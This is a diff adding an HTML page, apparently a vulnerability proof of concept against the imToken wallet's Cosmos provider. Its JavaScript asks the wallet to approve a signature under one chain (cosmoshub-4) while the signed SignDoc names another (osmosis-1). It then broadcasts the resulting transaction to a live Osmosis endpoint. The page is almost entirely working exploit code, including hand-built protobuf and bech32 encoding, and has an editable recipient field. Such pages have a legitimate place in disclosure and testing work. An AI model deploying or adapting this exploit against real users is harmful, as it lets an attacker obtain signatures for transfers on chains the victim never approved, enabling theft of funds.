@@ -1,0 +1,578 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Cosmos signDoc.chainId mismatch broadcast PoC</title>
+  <style>
+    :root {
+      color-scheme: light dark;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #101318;
+      color: #eef3f8;
+    }
+    body {
+      margin: 0;
+      padding: 18px;
+    }
+    main {
+      max-width: 920px;
+      margin: 0 auto;
+    }
+    h1 {
+      font-size: 22px;
+      margin: 0 0 8px;
+    }
+    p {
+      color: #b9c3cf;
+      line-height: 1.45;
+    }
+    .card {
+      border: 1px solid #2c3644;
+      border-radius: 8px;
+      padding: 14px;
+      margin: 14px 0;
+      background: #161b22;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      color: #c8d1dc;
+      margin: 12px 0 6px;
+    }
+    input, select, button, textarea {
+      width: 100%;
+      box-sizing: border-box;
+      border-radius: 8px;
+      border: 1px solid #344254;
+      background: #0d1117;
+      color: #eef3f8;
+      padding: 10px;
+      font-size: 15px;
+    }
+    button {
+      border: 0;
+      background: #2f81f7;
+      font-weight: 700;
+      margin-top: 10px;
+    }
+    button.secondary {
+      background: #303844;
+    }
+    button.danger {
+      background: #d1242f;
+    }
+    button:disabled {
+      opacity: .5;
+    }
+    .grid {
+      display: grid;
+      gap: 10px;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    }
+    .warn {
+      border-color: #d29922;
+      background: #241a05;
+      color: #ffdf8a;
+    }
+    .ok {
+      color: #7ee787;
+    }
+    .bad {
+      color: #ff7b72;
+    }
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 12px;
+      min-height: 140px;
+    }
+    .row {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .row input[type="checkbox"] {
+      width: auto;
+    }
+    small {
+      color: #8b949e;
+    }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Cosmos signDoc.chainId mismatch broadcast PoC</h1>
+  <p>
+    This PoC asks imToken for a signature under the outer approved chain, but
+    places another chain ID inside the actual Cosmos SignDoc. It then broadcasts
+    the signed TxRaw to the target chain LCD.
+  </p>
+
+  <section class="card warn">
+    Use a small funded test wallet. Default recipient is the same derived target-chain address, so the transfer is a self-transfer and the expected cost is mainly gas fee.
+  </section>
+
+  <section class="card">
+    <div class="grid">
+      <div>
+        <label for="outerChain">Outer wallet/request chain shown to imToken</label>
+        <input id="outerChain" value="cosmoshub-4" />
+      </div>
+      <div>
+        <label for="targetChain">Inner signed SignDoc chain</label>
+        <input id="targetChain" value="osmosis-1" />
+      </div>
+      <div>
+        <label for="targetPrefix">Target bech32 prefix</label>
+        <input id="targetPrefix" value="osmo" />
+      </div>
+      <div>
+        <label for="denom">Target denom</label>
+        <input id="denom" value="uosmo" />
+      </div>
+    </div>
+
+    <label for="lcd">Target LCD endpoint</label>
+    <input id="lcd" value="https://lcd.osmosis.zone" />
+
+    <div class="grid">
+      <div>
+        <label for="amount">Transfer amount in base units</label>
+        <input id="amount" value="1" inputmode="numeric" />
+      </div>
+      <div>
+        <label for="fee">Fee amount in base units</label>
+        <input id="fee" value="5000" inputmode="numeric" />
+      </div>
+      <div>
+        <label for="gas">Gas limit</label>
+        <input id="gas" value="200000" inputmode="numeric" />
+      </div>
+    </div>
+
+    <label for="recipient">Recipient on target chain</label>
+    <input id="recipient" placeholder="Click Prepare first; defaults to self-transfer" />
+
+    <label for="memo">Memo</label>
+    <input id="memo" value="imToken Cosmos chainId mismatch PoC" />
+
+    <div class="row" style="margin-top:12px">
+      <input id="ack" type="checkbox" />
+      <label for="ack" style="margin:0">I understand this will broadcast a real target-chain transaction.</label>
+    </div>
+
+    <button id="prepare">1. Prepare account and unsigned tx</button>
+    <button id="sign" class="secondary" disabled>2. Sign with mismatched SignDoc</button>
+    <button id="broadcast" class="danger" disabled>3. Broadcast signed TxRaw</button>
+  </section>
+
+  <section class="card">
+    <h2 style="font-size:16px;margin:0 0 8px">Status</h2>
+    <pre id="log"></pre>
+  </section>
+</main>
+
+<script>
+  const $ = (id) => document.getElementById(id)
+  const state = {
+    provider: null,
+    key: null,
+    outerAddress: '',
+    targetAddress: '',
+    bodyBytes: null,
+    authInfoBytes: null,
+    signed: null,
+    txRawBytes: null,
+  }
+
+  function log(message, obj) {
+    const prev = $('log').textContent
+    const extra = obj ? '\n' + JSON.stringify(obj, replacer, 2) : ''
+    $('log').textContent = `${new Date().toISOString()} ${message}${extra}\n\n${prev}`
+  }
+
+  function replacer(_key, value) {
+    if (value instanceof Uint8Array) return bytesToHex(value)
+    return value
+  }
+
+  function getProvider() {
+    const provider = window.cosmos || window.leap
+    if (!provider) {
+      throw new Error('No Cosmos provider found. Open this page inside imToken DApp browser.')
+    }
+    return provider
+  }
+
+  function utf8(s) {
+    return new TextEncoder().encode(String(s))
+  }
+
+  function concat(...parts) {
+    const total = parts.reduce((n, p) => n + p.length, 0)
+    const out = new Uint8Array(total)
+    let offset = 0
+    parts.forEach((p) => {
+      out.set(p, offset)
+      offset += p.length
+    })
+    return out
+  }
+
+  function varint(value) {
+    let n = BigInt(value)
+    const out = []
+    while (n >= 0x80n) {
+      out.push(Number((n & 0x7fn) | 0x80n))
+      n >>= 7n
+    }
+    out.push(Number(n))
+    return new Uint8Array(out)
+  }
+
+  function fieldKey(no, wire) {
+    return varint((BigInt(no) << 3n) | BigInt(wire))
+  }
+
+  function bytesField(no, bytes) {
+    return concat(fieldKey(no, 2), varint(bytes.length), bytes)
+  }
+
+  function stringField(no, value) {
+    return bytesField(no, utf8(value))
+  }
+
+  function uint64Field(no, value) {
+    return concat(fieldKey(no, 0), varint(value))
+  }
+
+  function coin(denom, amount) {
+    return concat(stringField(1, denom), stringField(2, String(amount)))
+  }
+
+  function any(typeUrl, value) {
+    return concat(stringField(1, typeUrl), bytesField(2, value))
+  }
+
+  function msgSend(from, to, denom, amount) {
+    return concat(
+      stringField(1, from),
+      stringField(2, to),
+      bytesField(3, coin(denom, amount))
+    )
+  }
+
+  function txBody(messages, memo) {
+    const encodedMessages = messages.map((m) =>
+      bytesField(1, any('/cosmos.bank.v1beta1.MsgSend', m))
+    )
+    const memoField = memo ? stringField(2, memo) : new Uint8Array()
+    return concat(...encodedMessages, memoField)
+  }
+
+  function pubKeySecp256k1(keyBytes) {
+    return any('/cosmos.crypto.secp256k1.PubKey', bytesField(1, keyBytes))
+  }
+
+  function modeInfoDirectSingle() {
+    const single = uint64Field(1, 1)
+    return bytesField(1, single)
+  }
+
+  function signerInfo(pubKeyBytes, sequence) {
+    return concat(
+      bytesField(1, pubKeySecp256k1(pubKeyBytes)),
+      bytesField(2, modeInfoDirectSingle()),
+      uint64Field(3, sequence)
+    )
+  }
+
+  function feeInfo(denom, amount, gasLimit) {
+    return concat(bytesField(1, coin(denom, amount)), uint64Field(2, gasLimit))
+  }
+
+  function authInfo(pubKeyBytes, sequence, denom, feeAmount, gasLimit) {
+    return concat(
+      bytesField(1, signerInfo(pubKeyBytes, sequence)),
+      bytesField(2, feeInfo(denom, feeAmount, gasLimit))
+    )
+  }
+
+  function txRaw(bodyBytes, authInfoBytes, signatureBytes) {
+    return concat(
+      bytesField(1, bodyBytes),
+      bytesField(2, authInfoBytes),
+      bytesField(3, signatureBytes)
+    )
+  }
+
+  function bytesToHex(bytes) {
+    return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('')
+  }
+
+  function base64ToBytes(base64) {
+    const bin = atob(base64)
+    const out = new Uint8Array(bin.length)
+    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i)
+    return out
+  }
+
+  function bytesToBase64(bytes) {
+    let s = ''
+    for (let i = 0; i < bytes.length; i += 0x8000) {
+      s += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000))
+    }
+    return btoa(s)
+  }
+
+  const BECH32_ALPHABET = 'qpzry9x8gf2tvdw0s3jn54khce6mua7l'
+
+  function bech32Polymod(values) {
+    const generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
+    let chk = 1
+    for (const value of values) {
+      const top = chk >> 25
+      chk = ((chk & 0x1ffffff) << 5) ^ value
+      for (let i = 0; i < 5; i++) {
+        if ((top >> i) & 1) chk ^= generator[i]
+      }
+    }
+    return chk
+  }
+
+  function bech32HrpExpand(hrp) {
+    const out = []
+    for (let i = 0; i < hrp.length; i++) out.push(hrp.charCodeAt(i) >> 5)
+    out.push(0)
+    for (let i = 0; i < hrp.length; i++) out.push(hrp.charCodeAt(i) & 31)
+    return out
+  }
+
+  function convertBits(data, fromBits, toBits, pad) {
+    let acc = 0
+    let bits = 0
+    const ret = []
+    const maxv = (1 << toBits) - 1
+    for (const value of data) {
+      if (value < 0 || (value >> fromBits) !== 0) throw new Error('Invalid bech32 data')
+      acc = (acc << fromBits) | value
+      bits += fromBits
+      while (bits >= toBits) {
+        bits -= toBits
+        ret.push((acc >> bits) & maxv)
+      }
+    }
+    if (pad) {
+      if (bits > 0) ret.push((acc << (toBits - bits)) & maxv)
+    } else if (bits >= fromBits || ((acc << (toBits - bits)) & maxv)) {
+      throw new Error('Invalid bech32 padding')
+    }
+    return ret
+  }
+
+  function createChecksum(hrp, data) {
+    const values = bech32HrpExpand(hrp).concat(data).concat([0, 0, 0, 0, 0, 0])
+    const mod = bech32Polymod(values) ^ 1
+    const ret = []
+    for (let p = 0; p < 6; p++) ret.push((mod >> (5 * (5 - p))) & 31)
+    return ret
+  }
+
+  function bech32Encode(hrp, bytes) {
+    const words = convertBits(bytes, 8, 5, true)
+    const checksum = createChecksum(hrp, words)
+    return hrp + '1' + words.concat(checksum).map((v) => BECH32_ALPHABET[v]).join('')
+  }
+
+  function normalizeLcd(url) {
+    return url.replace(/\/+$/, '')
+  }
+
+  function parseAccount(account) {
+    if (!account || typeof account !== 'object') return null
+    if (account.account_number !== undefined && account.sequence !== undefined) {
+      return {
+        accountNumber: String(account.account_number),
+        sequence: String(account.sequence),
+      }
+    }
+    for (const value of Object.values(account)) {
+      const found = parseAccount(value)
+      if (found) return found
+    }
+    return null
+  }
+
+  async function fetchTargetAccount(lcd, address) {
+    const res = await fetch(`${normalizeLcd(lcd)}/cosmos/auth/v1beta1/accounts/${address}`)
+    if (!res.ok) {
+      throw new Error(`Target account query failed: HTTP ${res.status}. Fund the target-chain address first.`)
+    }
+    const json = await res.json()
+    const parsed = parseAccount(json.account)
+    if (!parsed) throw new Error('Could not parse account_number/sequence from target chain response')
+    return parsed
+  }
+
+  async function fetchBalance(lcd, address, denom) {
+    const res = await fetch(`${normalizeLcd(lcd)}/cosmos/bank/v1beta1/balances/${address}/by_denom?denom=${encodeURIComponent(denom)}`)
+    if (!res.ok) return null
+    const json = await res.json()
+    return json.balance || null
+  }
+
+  async function prepare() {
+    state.provider = getProvider()
+    const outerChain = $('outerChain').value.trim()
+    const targetPrefix = $('targetPrefix').value.trim()
+    const targetChain = $('targetChain').value.trim()
+    const denom = $('denom').value.trim()
+    const amount = $('amount').value.trim()
+    const fee = $('fee').value.trim()
+    const gas = $('gas').value.trim()
+    const memo = $('memo').value
+    const lcd = $('lcd').value.trim()
+
+    if (!outerChain || !targetChain || !targetPrefix || !denom || !lcd) {
+      throw new Error('Missing chain/prefix/denom/LCD input')
+    }
+    if (!/^[0-9]+$/.test(amount) || !/^[0-9]+$/.test(fee) || !/^[0-9]+$/.test(gas)) {
+      throw new Error('Amount, fee, and gas must be integer base units')
+    }
+
+    log(`Requesting provider.enable(${outerChain})`)
+    await state.provider.enable(outerChain)
+
+    state.key = await state.provider.getKey(outerChain)
+    state.outerAddress = state.key.bech32Address
+    state.targetAddress = bech32Encode(targetPrefix, state.key.address)
+
+    if (!$('recipient').value.trim()) $('recipient').value = state.targetAddress
+    const recipient = $('recipient').value.trim()
+
+    const account = await fetchTargetAccount(lcd, state.targetAddress)
+    const balance = await fetchBalance(lcd, state.targetAddress, denom)
+
+    const send = msgSend(state.targetAddress, recipient, denom, amount)
+    state.bodyBytes = txBody([send], memo)
+    state.authInfoBytes = authInfo(state.key.pubKey, account.sequence, denom, fee, gas)
+    state.signed = null
+    state.txRawBytes = null
+
+    $('sign').disabled = false
+    $('broadcast').disabled = true
+
+    log('Prepared mismatched transaction', {
+      outerRequestChainShownToWallet: outerChain,
+      targetSignDocChainActuallySigned: targetChain,
+      outerWalletAddress: state.outerAddress,
+      targetChainFromAddress: state.targetAddress,
+      targetChainRecipient: recipient,
+      targetAccountNumber: account.accountNumber,
+      targetSequence: account.sequence,
+      targetBalance: balance,
+      amount: `${amount} ${denom}`,
+      fee: `${fee} ${denom}`,
+      gasLimit: gas,
+      bodyBytesHex: bytesToHex(state.bodyBytes),
+      authInfoBytesHex: bytesToHex(state.authInfoBytes),
+    })
+  }
+
+  async function signMismatch() {
+    if (!state.bodyBytes || !state.authInfoBytes || !state.key) {
+      throw new Error('Click Prepare first')
+    }
+    const outerChain = $('outerChain').value.trim()
+    const targetChain = $('targetChain').value.trim()
+    const lcd = $('lcd').value.trim()
+    const account = await fetchTargetAccount(lcd, state.targetAddress)
+
+    log(`Opening imToken sign modal: outer=${outerChain}, inner signDoc.chainId=${targetChain}`)
+    state.signed = await state.provider.signDirect(
+      outerChain,
+      state.outerAddress,
+      {
+        bodyBytes: state.bodyBytes,
+        authInfoBytes: state.authInfoBytes,
+        chainId: targetChain,
+        accountNumber: account.accountNumber,
+        sequence: account.sequence,
+      }
+    )
+
+    const signatureBytes = base64ToBytes(state.signed.signature.signature)
+    state.txRawBytes = txRaw(
+      state.signed.signed.bodyBytes,
+      state.signed.signed.authInfoBytes,
+      signatureBytes
+    )
+
+    $('broadcast').disabled = false
+
+    log('Signature returned by wallet', {
+      signedChainIdReturnedByWallet: state.signed.signed.chainId,
+      expectedTargetChain: targetChain,
+      outerRequestChainUsedForWalletValidation: outerChain,
+      signature: state.signed.signature,
+      txRawBase64: bytesToBase64(state.txRawBytes),
+    })
+  }
+
+  async function broadcast() {
+    if (!$('ack').checked) throw new Error('Please tick the broadcast acknowledgement checkbox')
+    if (!state.txRawBytes) throw new Error('Click Sign first')
+
+    const lcd = normalizeLcd($('lcd').value.trim())
+    const body = {
+      tx_bytes: bytesToBase64(state.txRawBytes),
+      mode: 'BROADCAST_MODE_SYNC',
+    }
+
+    log(`Broadcasting TxRaw to target LCD ${lcd}`)
+    const res = await fetch(`${lcd}/cosmos/tx/v1beta1/txs`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify(body),
+    })
+    const text = await res.text()
+    let json
+    try {
+      json = JSON.parse(text)
+    } catch (_e) {
+      json = { raw: text }
+    }
+
+    const txr = json.tx_response || {}
+    const code = txr.code === undefined ? undefined : Number(txr.code)
+    const status = res.ok && (code === 0 || code === undefined) ? 'Broadcast response' : 'Broadcast failed or chain rejected tx'
+    log(status, {
+      httpStatus: res.status,
+      targetChain: $('targetChain').value.trim(),
+      txhash: txr.txhash,
+      code: txr.code,
+      raw_log: txr.raw_log,
+      response: json,
+    })
+  }
+
+  async function run(fn) {
+    try {
+      await fn()
+    } catch (e) {
+      log('ERROR: ' + (e && e.message ? e.message : String(e)))
+    }
+  }
+
+  $('prepare').onclick = () => run(prepare)
+  $('sign').onclick = () => run(signMismatch)
+  $('broadcast').onclick = () => run(broadcast)
+
+  log('Ready. Open this page inside imToken DApp browser, then click Prepare.')
+</script>
+</body>
+</html>
